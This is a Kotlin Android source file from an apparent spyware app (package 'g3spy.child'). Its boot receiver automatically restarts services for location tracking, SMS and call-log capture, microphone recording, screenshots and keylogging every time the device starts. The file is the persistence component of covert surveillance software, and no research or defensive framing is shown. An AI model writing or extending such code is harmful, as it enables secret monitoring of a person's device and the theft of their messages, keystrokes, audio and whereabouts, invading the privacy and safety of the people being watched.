package com.g3spy.child.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.g3spy.child.services.*

class BootReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "BootReceiver"
    }
    
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            Log.d(TAG, "Boot completed, starting services")
            
            startServices(context)
        }
    }
    
    private fun startServices(context: Context) {
        
        val locationIntent = Intent(context, LocationService::class.java)
        startServiceSafely(context, locationIntent, "LocationService")
        
        val smsIntent = Intent(context, SmsService::class.java)
        startServiceSafely(context, smsIntent, "SmsService")
        
        val callLogIntent = Intent(context, CallLogService::class.java)
        startServiceSafely(context, callLogIntent, "CallLogService")
        
        val micRecordingIntent = Intent(context, MicRecordingService::class.java)
        startServiceSafely(context, micRecordingIntent, "MicRecordingService")
        
        val screenshotIntent = Intent(context, ScreenshotService::class.java)
        startServiceSafely(context, screenshotIntent, "ScreenshotService")
        
        val keyloggerIntent = Intent(context, KeyloggerService::class.java)
        startServiceSafely(context, keyloggerIntent, "KeyloggerService")
    }
    
    private fun startServiceSafely(context: Context, intent: Intent, serviceName: String) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
            Log.d(TAG, "$serviceName started successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start $serviceName", e)
        }
    }
}